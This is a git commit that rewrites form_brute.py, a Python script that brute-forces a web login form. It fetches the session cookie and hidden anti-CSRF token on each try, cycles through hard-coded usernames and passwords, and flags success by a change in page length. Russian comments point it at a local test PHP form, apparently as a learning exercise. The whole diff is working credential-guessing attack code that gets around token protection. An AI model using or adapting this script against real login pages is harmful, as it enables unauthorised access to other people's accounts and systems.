bd97ebfd45e01778382022f29951a729ceb35cee
abychutkin <abychutkin@gmail.com>
2019-07-12 14:57:06 +0300

    Code rewritten

--- form_brute.py
+++ form_brute.py
@@ -1,57 +1,41 @@
-from urllib.request import *
-from urllib.parse import *
-import re
+import requests
+from bs4 import BeautifulSoup
 
 
-def getCookie():
-    req=Request(url)
-    response=urlopen(url)
-    cookie=response.getheader('Set-Cookie')
-    cookie=cookie.split('=')[1]
-    cookie=cookie[:cookie.find(';')]
-    return cookie
-
-
-def getToken(cookie):
-    pattern='(type="hidden" value=")([A-Za-z0-9]*)'
-    req=Request(url)
-    opener=build_opener()
-    opener.addheaders.append(('Cookie','PHPSESSID='+cookie))
-    response=opener.open(req)
-    html=response.read()
-    html=html.decode('utf-8')
-    tokenSearch=re.search(pattern,html)
-    token=tokenSearch.groups()[1]
+def get_token(page):
+    """Данная функция разбивает страницу на элементы с помощью модуля
+    bs4 и находит скрытый input и извлекает из него значение, это токен
+    который при каждом запросе изменяется"""
+    data = BeautifulSoup(page, 'lxml')
+    token = data.find('input', type='hidden')['value']
     return token
 
 
-def bruteForm(logins,passwords):
-    cookie=getCookie()
-    token=getToken(cookie)
-    values={'login':'adsds','password':'aaaa','token':token}
-    data=urlencode(values).encode('utf-8')
-    opener=build_opener()
-    opener.addheaders.append(('Cookie','PHPSESSID='+cookie))
-    response=opener.open(url,data)
-    error=len(response.read())
-    
-    for login in logins:
-        values['login']=login
-        for password in passwords:
-            values['password']=password
-            token=getToken(cookie)
-            values['token']=token
-            data=urlencode(values).encode('utf-8')
-            response=opener.open(url,data)
-            html=response.read()
-            if len(html)!=error:
-                print('[+]',end=' ')
-            else:
-                print('[-]',end=' ')
-            print('{0}:{1}'.format(login,password))
+# Адрес тестовой формы, для запуска php скрипта с формой достаточно в папке
+# с формой в консоли выполнить команду: php -S 127.0.0.1:9000
+url = 'http://127.0.0.1:9000'
 
+# Логины и пароли, используемые для перебора, их можно заменить на чтение
+# из файлов
+logins = ['administrator', 'user', 'root', 'admin']
+passwords = ['123454', 'admin', 'users', 'root', '987654']
 
-url='http://127.0.0.1:9000'
-logins=['administrator','user','root','admin']
-passwords=['123454','admin','users','root','987654']
-bruteForm(logins,passwords)
+# Данная сессия нужна для того, чтобы извлечь куки из ответа от сервера и
+# в дальнейшем отправлять запросы уже с куки
+session = requests.session()
+
+# Отправка GET запроса для получения куки и токена
+page = session.get(url)
+token = get_token(page.text)
+
+# Длина страницы, логин успешно не произошел
+failed = len(page.text)
+
+for login in logins:
+    for passw in passwords:
+        data = {'login': login, 'password': passw, 'token': token}
+        page = session.post(url, data=data)
+        if len(page.text) != failed:
+            print("Login: {}, Password: {}".format(login, passw))
+            break
+        token = get_token(page.text)
